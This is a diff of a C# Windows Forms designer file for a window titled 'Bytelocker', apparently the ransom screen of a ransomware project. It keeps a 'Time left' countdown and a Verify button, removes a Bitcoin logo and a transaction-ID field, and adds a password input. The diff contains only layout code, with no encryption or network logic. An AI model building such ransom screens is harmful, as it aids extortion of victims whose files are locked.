@@ -35,14 +35,12 @@
             this.lbTitle = new System.Windows.Forms.Label();
             this.pbShield = new System.Windows.Forms.PictureBox();
             this.lbTitleTime = new System.Windows.Forms.Label();
-            this.pbBitcoinLogo = new System.Windows.Forms.PictureBox();
             this.lbTimeLeft = new System.Windows.Forms.Label();
             this.tmTimeLeftRefresher = new System.Windows.Forms.Timer(this.components);
-            this.tbTransID = new System.Windows.Forms.TextBox();
+            this.tbPassInput = new System.Windows.Forms.TextBox();
             this.BtnBack = new System.Windows.Forms.Button();
             this.BtnVerify = new System.Windows.Forms.Button();
             ((System.ComponentModel.ISupportInitialize)(this.pbShield)).BeginInit();
-            ((System.ComponentModel.ISupportInitialize)(this.pbBitcoinLogo)).BeginInit();
             this.SuspendLayout();
             // 
             // btnNext
@@ -94,15 +92,6 @@
             this.lbTitleTime.TabIndex = 4;
             this.lbTitleTime.Text = "Time left:";
             // 
-            // pbBitcoinLogo
-            // 
-            this.pbBitcoinLogo.Image = ((System.Drawing.Image)(resources.GetObject("pbBitcoinLogo.Image")));
-            this.pbBitcoinLogo.Location = new System.Drawing.Point(391, 85);
-            this.pbBitcoinLogo.Name = "pbBitcoinLogo";
-            this.pbBitcoinLogo.Size = new System.Drawing.Size(152, 50);
-            this.pbBitcoinLogo.TabIndex = 5;
-            this.pbBitcoinLogo.TabStop = false;
-            // 
             // lbTimeLeft
             // 
             this.lbTimeLeft.AutoSize = true;
@@ -119,12 +108,12 @@
             this.tmTimeLeftRefresher.Interval = 1000;
             this.tmTimeLeftRefresher.Tick += new System.EventHandler(this.UpdateTimeLeftEvent);
             // 
-            // tbTransID
+            // tbPassInput
             // 
-            this.tbTransID.Location = new System.Drawing.Point(247, 168);
-            this.tbTransID.Name = "tbTransID";
-            this.tbTransID.Size = new System.Drawing.Size(341, 20);
-            this.tbTransID.TabIndex = 7;
+            this.tbPassInput.Location = new System.Drawing.Point(259, 95);
+            this.tbPassInput.Name = "tbPassInput";
+            this.tbPassInput.Size = new System.Drawing.Size(341, 20);
+            this.tbPassInput.TabIndex = 7;
             // 
             // BtnBack
             // 
@@ -153,9 +142,8 @@
             this.ClientSize = new System.Drawing.Size(759, 421);
             this.Controls.Add(this.BtnVerify);
             this.Controls.Add(this.BtnBack);
-            this.Controls.Add(this.tbTransID);
+            this.Controls.Add(this.tbPassInput);
             this.Controls.Add(this.lbTimeLeft);
-            this.Controls.Add(this.pbBitcoinLogo);
             this.Controls.Add(this.lbTitleTime);
             this.Controls.Add(this.pbShield);
             this.Controls.Add(this.lbTitle);
@@ -168,7 +156,6 @@
             this.Text = "Bytelocker";
             this.Load += new System.EventHandler(this.MainWindow_Load);
             ((System.ComponentModel.ISupportInitialize)(this.pbShield)).EndInit();
-            ((System.ComponentModel.ISupportInitialize)(this.pbBitcoinLogo)).EndInit();
             this.ResumeLayout(false);
             this.PerformLayout();
 
@@ -181,10 +168,9 @@
         private System.Windows.Forms.Label lbTitle;
         private System.Windows.Forms.PictureBox pbShield;
         private System.Windows.Forms.Label lbTitleTime;
-        private System.Windows.Forms.PictureBox pbBitcoinLogo;
         private System.Windows.Forms.Label lbTimeLeft;
         private System.Windows.Forms.Timer tmTimeLeftRefresher;
-        private System.Windows.Forms.TextBox tbTransID;
+        private System.Windows.Forms.TextBox tbPassInput;
         private System.Windows.Forms.Button BtnBack;
         private System.Windows.Forms.Button BtnVerify;
     }
